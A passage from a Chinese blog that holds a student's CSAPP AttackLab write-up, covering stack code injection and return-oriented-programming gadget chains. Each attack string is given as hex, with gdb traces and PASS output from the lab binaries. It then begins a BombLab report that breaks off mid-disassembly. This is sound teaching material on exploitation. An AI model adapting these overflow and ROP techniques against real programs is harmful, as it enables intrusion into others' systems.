<p>现在需要讨论的问题是，字符串应该放在栈上的什么地方？首先我们可以考虑将字符串放置在攻击字符串的前40个字节中。这样，具体的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 其中最后16个字节保存了cookie的字符串表示 */</span><br><span class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</span><br><span class="line">bf 90 dc 61 55 48 83 c4 /* 攻击代码 其中将%rdi指向cookie的字符串表示的首地址 */</span><br><span class="line">10 c3 00 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00 /* 返回地址 指向函数touch3 */</span><br></pre></td></tr></table></figure><br>下面我们用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3-2.txt|./hex2raw|./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Misfire: You called touch3(<span class="string">""</span>)</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:FAIL:0xffffffff:ctarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 A8 DC 61 55 00 00 00 00 BF 90 DC 61 55 48 83 C4 10 C3 00 00 00 00 00 00 FA 18 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>糟糕，程序出错了，从Misfire: You called touch3(“”)中我们可以看出，%rdi指向的字符串是空字符串。这显然与我们的预期不符。我们的攻击代码理应没有任何问题。那么问题出在哪儿呢？</p>
<p>下面我们将攻击字符串导出成文件并且在gdb中进行调试，具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3-2.txt|./hex2raw &gt; weirdError</span><br><span class="line">user@BlackDragon ~/C/A/target1&gt; gdb ctarget                 </span><br><span class="line">GNU gdb (GDB) 7.12.1</span><br><span class="line">Copyright (C) 2017 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line">Reading symbols from ctarget...done.</span><br><span class="line">(gdb) <span class="built_in">break</span> getbuf</span><br><span class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</span><br><span class="line">(gdb) run -i weirdError -q</span><br><span class="line">Starting program: /home/zhihaochen/CSAPPLabs/AttackLab/target1/ctarget -i weirdError -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getbuf () at buf.c:12</span><br><span class="line">12	buf.c: 没有那个文件或目录.</span><br><span class="line">(gdb) nexti 5</span><br><span class="line">0x00000000004017bd	16	<span class="keyword">in</span> buf.c</span><br><span class="line">(gdb) x /16b 0x5561dc90</span><br><span class="line">0x5561dc90:	53	57	98	57	57	55	102	97</span><br><span class="line">0x5561dc98:	0	0	0	0	0	0	0	0</span><br><span class="line">......After Some Steps......</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> touch3:</span><br><span class="line">   0x00000000004018fa &lt;+0&gt;:	push   %rbx</span><br><span class="line">   0x00000000004018fb &lt;+1&gt;:	mov    %rdi,%rbx</span><br><span class="line">   0x00000000004018fe &lt;+4&gt;:	movl   <span class="variable">$0x3</span>,0x202bd4(%rip)        <span class="comment"># 0x6044dc &lt;vlevel&gt;</span></span><br><span class="line">   0x0000000000401908 &lt;+14&gt;:	mov    %rdi,%rsi</span><br><span class="line">   0x000000000040190b &lt;+17&gt;:	mov    0x202bd3(%rip),%edi        <span class="comment"># 0x6044e4 &lt;cookie&gt;</span></span><br><span class="line">=&gt; 0x0000000000401911 &lt;+23&gt;:	callq  0x40184c &lt;hexmatch&gt;</span><br><span class="line">   0x0000000000401916 &lt;+28&gt;:	<span class="built_in">test</span>   %eax,%eax</span><br><span class="line">   0x0000000000401918 &lt;+30&gt;:	je     0x40193d &lt;touch3+67&gt;</span><br><span class="line">   0x000000000040191a &lt;+32&gt;:	mov    %rbx,%rdx</span><br><span class="line">   0x000000000040191d &lt;+35&gt;:	mov    <span class="variable">$0x403138</span>,%esi</span><br><span class="line">   0x0000000000401922 &lt;+40&gt;:	mov    <span class="variable">$0x1</span>,%edi</span><br><span class="line">   0x0000000000401927 &lt;+45&gt;:	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x000000000040192c &lt;+50&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x0000000000401931 &lt;+55&gt;:	mov    <span class="variable">$0x3</span>,%edi</span><br><span class="line">   0x0000000000401936 &lt;+60&gt;:	callq  0x401c8d &lt;validate&gt;</span><br><span class="line">   0x000000000040193b &lt;+65&gt;:	jmp    0x40195e &lt;touch3+100&gt;</span><br><span class="line">   0x000000000040193d &lt;+67&gt;:	mov    %rbx,%rdx</span><br><span class="line">   0x0000000000401940 &lt;+70&gt;:	mov    <span class="variable">$0x403160</span>,%esi</span><br><span class="line">   0x0000000000401945 &lt;+75&gt;:	mov    <span class="variable">$0x1</span>,%edi</span><br><span class="line">   0x000000000040194a &lt;+80&gt;:	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">(gdb) x /16b 0x5561dc90</span><br><span class="line">0x5561dc90:	53	57	98	57	57	55	102	97</span><br><span class="line">0x5561dc98:	0	0	0	0	0	0	0	0</span><br><span class="line">(gdb) nexti</span><br><span class="line">0x0000000000401916	73	<span class="keyword">in</span> visible.c</span><br><span class="line">(gdb) x /16b 0x5561dc90</span><br><span class="line">0x5561dc90:	0	-98	119	-23	120	13	-32	-89</span><br><span class="line">0x5561dc98:	-112	-36	97	85	0	0	0	0</span><br></pre></td></tr></table></figure><br>我们可以注意到，在函数touch3调用函数hexmatch的前后，0x5561dc90指向的内存并不是我们一开始注入的cookie的字符串表示，而是被填充了其他的数据。这是由于调用新的函数（hexmatch以及hexmatch调用的函数）使得栈帧继续向下增长，从而覆盖了原先我们注入的数据的原因。</p>
<p>我们可以在gdb中实际的运行一下ctarget来得出执行hexmatch函数到底会覆盖多少栈空间，然后根据结果重写我们的攻击代码。<br>但是我在这里采用了另外一种方法是直接将cookie的字符串表示写到攻击代码的最后，这样，这段字符串将会处于相对的高地址，由于栈的增长方向是从高地址到低地址，这样，注入的字符串将绝对不会因函数调用而被覆盖。</p>
<p>最终，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</span><br><span class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</span><br><span class="line">bf c0 dc 61 55 48 83 c4</span><br><span class="line">10 c3 00 00 00 00 00 00 /* 攻击代码 其中将%rdi指向字符串的首地址（栈的高地址）*/</span><br><span class="line">fa 18 40 00 00 00 00 00 /* 返回地址 指向函数touch3 */</span><br><span class="line">35 39 62 39 39 37 66 61 /* cookie的字符串表示 共9个字节（包括<span class="string">'/0'</span>） */</span><br><span class="line">00</span><br></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3.txt|./hex2raw|./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 A8 DC 61 55 00 00 00 00 BF C0 DC 61 55 48 83 C4 10 C3 00 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><br>本阶段完成。</p>
<h3 id="第二部分-返回导向编程（Return-Oriented-Programming）攻击"><a href="#第二部分-返回导向编程（Return-Oriented-Programming）攻击" class="headerlink" title="第二部分 返回导向编程（Return-Oriented Programming）攻击"></a>第二部分 返回导向编程（Return-Oriented Programming）攻击</h3><p>为了对抗缓冲区溢出攻击，现代编译器和操作系统采用了很多机制。第二部分的目标文件rtarget就采用了以下两种技术：</p>
<ul>
<li>栈随机化技术，每一次运行程序时，栈的起始位置都是不固定的，几乎不可能确定你攻击代码在栈上的位置。</li>
<li>禁止执行栈上的代码，所以当你尝试将PC指向栈段的时候，程序只能因Segmentation Fault而退出。</li>
</ul>
<p>下面我们引入返回导向编程（Return-Oriented Programming）技术来实现在以上两种限制情况下执行代码。</p>
<p>C语言程序是由若干的函数组成的，每一个函数都以ret结束，下面我们给出一个函数，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	*p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>以及这个函数的反汇编结果，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">400f15:		c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7	movl	<span class="number">$0</span>xc78948d4,(%rdi)</span><br><span class="line">400f1b:		c3					retq</span><br></pre></td></tr></table></figure></p>
<p>尽管栈随机化以及禁止在栈段执行代码，但是通过缓冲区溢出攻击，我们仍然可以覆盖返回地址并且让PC跳转至代码段的相应位置。例如让getbuf返回后跳转至0x400f15，尽管这看起来并没有什么意义，因为程序的代码和我们攻击的代码的逻辑是不同的，攻击代码和程序已有代码相同的可能性几乎是0。</p>
<p>现在，让我们换一个思路，如果让getbuf返回后跳转到0x400f18，会怎么样呢？</p>
<p>从0x400f18开始的三个字节48 89 c7代表的是movq %rax, %rdi，然后紧跟的c3代表的是ret。在攻击中，这段代码就比movl $0xc78948d4,(%rdi) ret这样的代码更有意义。并且当这段代码执行完毕，ret又迫使程序跳转到下一个返回地址指向的地方。</p>
<p>现在我们可以利用程序本身的代码，构造出一组由不同的返回地址组成的攻击代码，每一个返回地址都指向了一个函数的最末尾的若干字节，由ret结尾。这样，程序就会按照我们设计的顺序依次执行这些代码片段，以达到修改程序行为的结果，这就是返回导向编程。这些代码片段被称作gadget，而这些gadgets共同组成了一个gadget farm。</p>
<h4 id="等级2-1"><a href="#等级2-1" class="headerlink" title="等级2"></a>等级2</h4><p>在阶段4中，我们将重复阶段2的攻击，只是这一次目标文件为rtarget。为了简化期间，在本次实验中，你仅能从gadget farm中利用movq，popq，ret，nop这四种类型的指令以及x86_64的前8个寄存器（%rax-%rdi）的gadget去构造答案。并且在阶段4中，你只能使用farm.c中start_farm()和mid_farm()之间的gadget来实现攻击。</p>
<p>当一个gadget用到了popq指令，它将会从栈中pop数据，因此，你的攻击代码将会同时包括gadget地址以及数据。</p>
<p>阶段4的思路很简单，我们只要首先从栈中将cookie的8位数字pop到一个寄存器中，再使用mov指令将该寄存器的值送入%rdi中，或者更加直接，将cookie从栈中pop至%rdi中，最后再将返回地址设置为touch2即可。具体要看gadget farm中都提供了哪些gadgets。</p>
<p>我们首先观察gadget_farm中的相关gadgets，并决定其是否可以用作攻击。根据上述的思路，我们可以得到两个gadget set_val426及getval_280，它们的反汇编代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:       c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 <span class="number">90</span>       movl   <span class="number">$0</span>x90c78948,(%rdi)</span><br><span class="line">  4019c9:       c3						retq  </span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:       b8 <span class="number">29</span> <span class="number">58</span> <span class="number">90</span> c3          <span class="keyword">mov</span>    <span class="number">$0</span>xc3905829,%eax</span><br><span class="line">  4019cf:       c3                      retq   </span><br></pre></td></tr></table></figure><br>setval_426中的48 89 c7 90 c3可以被解释为mov %rax,%rdi nop ret，而getval_280中的58 90 c3可以被解释为pop %rax nop ret。<br>将这两个gadget结合，即可以得到阶段4的结果，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</span><br><span class="line">cc 19 40 00 00 00 00 00 /* pop %rax */</span><br><span class="line">fa 97 b9 59 00 00 00 00 /* cookie */</span><br><span class="line">c5 19 40 00 00 00 00 00 /* mov %rax,%rdi */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* touch2 */</span><br></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/rtarget/level2/level2.txt|./hex2raw|./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级3-1"><a href="#等级3-1" class="headerlink" title="等级3"></a>等级3</h4><p>在阶段5中，我们将在rtarget中重复阶段3的攻击，即将目标字符串的首地址作为参数传递给函数touch3。这是所有阶段中最难的一个阶段。</p>
<p>首先，考虑到代码段部分以及栈段部分的地址的高4字节都是0，以及x86下任何以32位寄存器作为目标寄存器的指令都会将该寄存器的高4字节置0，我们同样可以使用movl替代movq。</p>
<p>在本阶段中，我们显然是需要将cookie的字符串表示存入栈段的，这个阶段的核心问题是如何定位该字符串的首地址，在栈地址随机的情况下，这是很难的。</p>
<p>首先想到的是利用mov指令将%rsp的值送入另一个寄存器，但是在执行这样的gadget时，寄存器rsp指向的是下一个gadget的返回地址，而不是字符串的首地址，而如果让其指向字符串的首地址，那么又无法在最后返回到函数touch3。</p>
<p>我在做这个实验的时候，在这里卡了很久。最后才注意到在gadget farm中有一个叫做add_xy的函数，这个函数的功能是将%rdi与%rsi相加并保存至%rax，豁然开朗。做题目（进行攻击）的时候还是不能太死板，一定要充分利用目标程序本身提供的代码，一味地按照固有的套路做有时只会浪费时间和精力。</p>
<p>整个阶段5的思路如下，首先将rsp存入某个寄存器之中，然后再将一个特定的常量pop至另一个寄存器之中，最后将这两个值分别存入%rsi和%rdi，调用add_xy将其相加得到字符串的首地址，并将结果%rax存入%rdi之中，最后再调用函数touch3即可。</p>
<p>受制于gadget的种类，我们可能会用到多个gadget做中转。最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</span><br><span class="line">06 1a 40 00 00 00 00 00 /* mov %rsp,%rax */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi &lt;- %rax指向的地址*/</span><br><span class="line">ab 19 40 00 00 00 00 00 /* pop %rax */</span><br><span class="line">48 00 00 00 00 00 00 00 /* offset constant*/</span><br><span class="line">dd 19 40 00 00 00 00 00 /* mov %eax,%edx */</span><br><span class="line">34 1a 40 00 00 00 00 00 /* mov %edx,%ecx */</span><br><span class="line">13 1a 40 00 00 00 00 00 /* mov %ecx,%esi */</span><br><span class="line">d6 19 40 00 00 00 00 00 /* add_xy */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi */</span><br><span class="line">fa 18 40 00 00 00 00 00 /* touch3 */</span><br><span class="line">35 39 62 39 39 37 66 61 /* cookie的字符串表示 与前面保存的rsp总共差了9条语句 故常量为0x48*/</span><br><span class="line">00</span><br></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/rtarget/level3/level3.txt|./hex2raw|./rtarget -q                </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><br>本阶段完成。</p>
<blockquote>
<p>注意，在第二部分中，可能使用不同的Gadget去实现相同的攻击效果，答案仅供参考，但并不是唯一的。</p>
</blockquote>
<p>至此，整个实验完成。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>相比与BombLab来说，整个AttackLab总体比较简单，主要需要自行阅读讲义中的材料学习相关的攻击方式并将其运用，考虑到讲义中给出的提示，除了阶段5以外整体不是很难。</p>
<p>在这次实验中，主要的两个问题以及收获：</p>
<ul>
<li>字节序的问题，需要对栈的增长方向以及小端法的字节序加以理解。</li>
<li>ROP攻击要充分利用程序本身，而不是循规蹈矩地盲目寻找Gadgets，这样只会在阶段五卡住。</li>
</ul>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/05/09/深入理解计算机系统AttackLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/04/18/深入理解计算机系统BombLab实验报告/">
                            深入理解计算机系统BombLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-04-18T00:10:24+08:00">
	
		    4月 18, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/BombLab" target="_blank" rel="noopener">Github</a>上</p>
<blockquote>
<p>用了一周的时间读完了《深入理解计算机系统》的第三章：程序的机器级表示。对于x86_64汇编及其逆向工程有了一定的了解。于2017年4月16日完成了其第二个Lab - Bomb Lab.</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Bomb Lab - Defusing a Binary Bomb主要是关于反汇编的实验，对应于书本的第三章：程序的机器级表示。</p>
<p>本实验非常的有趣。实验给定了一个二进制程序Bomb（炸弹）。这个炸弹由若干阶段组成，每个阶段都要求你在标准输入流中输入一个字符串，如果字符串正确，那么该阶段就会被解除并且程序会进入下一个阶段。如果字符串错误，那么炸弹会爆炸，并且退出。当每个阶段都被解除后，整个炸弹将会被解除。</p>
<p>在正式的实验中，每个学生将会从服务器处得到一个独一无二的炸弹，解除每个炸弹所需要的字符串都是不同的。同时，引爆炸弹将会导致扣分。当实验结束后，可以从服务器的计分板上看到每个学生的成绩。<br>本实验主要要求学生能够理解汇编代码，同时要求学生能学会使用一个Debugger（调试器）。</p>
<p>本实验提供的答案仅针对官网给出的自学者讲义中的<a href="http://csapp.cs.cmu.edu/3e/bomb.tar" target="_blank" rel="noopener">炸弹</a>。</p>
<h2 id="实验提示"><a href="#实验提示" class="headerlink" title="实验提示"></a>实验提示</h2><ul>
<li>学会使用一个debugger（调试器），在本次实验中，使用GDB - GNU Debugger</li>
<li>使用<code>objdump -t</code>得到bomb的符号表。符号表包含了bomb中所有函数，全局变量，以及调用的函数的名字及地址。</li>
<li>使用<code>objdump -d</code>得到bomb的反汇编结果。但是注意，系统级别的函数调用将会以被加密的形式出现在反汇编代码中，如果需要知道这些信息，需要在gdb中对相应的函数进行反汇编。</li>
</ul>
<h2 id="实验过程及分析"><a href="#实验过程及分析" class="headerlink" title="实验过程及分析"></a>实验过程及分析</h2><h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><ol>
<li>熟悉GDB的使用，并且使用<code>objdump -t bomb &gt; bomb-symboltable</code>生成bomb的符号表，再使用<code>objdump -d bomb &gt; bomb-disassemble</code>生成bomb的反汇编文件。</li>
<li>确保即时输入了错误的字符串炸弹也不会爆炸。观察bomb的符号表可以发现函数explode_bomb，推测该函数的作用是引爆炸弹，因此在GDB中使用break explode_bomb为该函数添加断点。这样，我们可以在bomb爆炸前提前截获并处理。</li>
<li>观察符号表可以看到phase_1到phase_6这几个函数以及其他的相关辅助函数，我们要做的就是给每一个阶段的函数添加断点，反汇编，并且理解这些函数的作用，并推测出答案。</li>
</ol>
<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><h4 id="主函数-main"><a href="#主函数-main" class="headerlink" title="主函数 - main"></a>主函数 - main</h4><p>首先在bomb-disassemble中观察main的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">0000000000400da0 &lt;main&gt;:</span><br><span class="line">  400da0:       <span class="number">53</span>                      <span class="keyword">push</span>   %rbx</span><br><span class="line">  400da1:       <span class="number">83</span> ff <span class="number">01</span>                <span 